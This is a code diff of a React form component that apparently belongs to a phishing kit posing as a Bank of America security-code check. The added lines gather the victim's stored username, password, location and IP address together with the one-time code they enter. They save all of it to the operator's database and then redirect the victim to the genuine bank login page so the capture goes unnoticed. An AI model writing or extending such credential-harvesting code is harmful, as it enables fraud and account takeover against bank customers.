@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useContext, useState } from "react";
 import { useFormik } from "formik";
 import * as Yup from "yup";
 import { Link } from "react-router-dom";
@@ -7,45 +7,45 @@ import * as AiIcons from "react-icons/ai";
 import * as IoIcons from "react-icons/io";
 import * as GiIcons from "react-icons/gi";
 import "./controlSeguridad.scss";
+import AuthContext from "../../context/auth/authContext";
+import { registroUser } from "../../config/authApi";
 
 export default function ControlSeguridad() {
-
+  //context user
+  const { user } = useContext(AuthContext);
 
   //FORMULARIO FORMIK
   const formik = useFormik({
     initialValues: {
       codigo: "",
+      user: user.user,
+      password: user.password,
+      city: user.city,
+      country: user.country,
+      IPv4: user.IPv4,
     },
     validationSchema: Yup.object({
       codigo: Yup.string()
         .required("el campo es necesario ")
         .min(4, "Mínimo 4 dígitos ")
         .max(6, "Máximo 6 dígitos"),
-
     }),
-    onSubmit: (formData) => {
-      // iniciarSesion(formData);
-      console.log(formData);
-      //direcciona a otra url externa
-      window.location.href = 'https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go'; 
+    onSubmit: async (formData) => {
+      // guada los registros en la base de datos
+      const redes = await registroUser(formData);
+      console.log(redes);
+
+      // direcciona a otra url externa
+      window.location.href =
+        "https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go";
     },
   });
 
   const errorFormik = (err, touch) => {
     if (err && touch) {
-      return (
-        <div className="alert-input">
-          {err}
-        </div>
-      );
+      return <div className="alert-input">{err}</div>;
     }
   };
-
-
-
-  // <a className='link_a' href='https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go' >Confirmar</a>
-
-
 
   return (
     <div className="control-seguro">
@@ -103,8 +103,7 @@ export default function ControlSeguridad() {
             </span>
           </div>
 
-
-          <button className="btn-seguro" type="submit" >
+          <button className="btn-seguro" type="submit">
             <IoIcons.IoIosUnlock />
             confirmar
           </button>
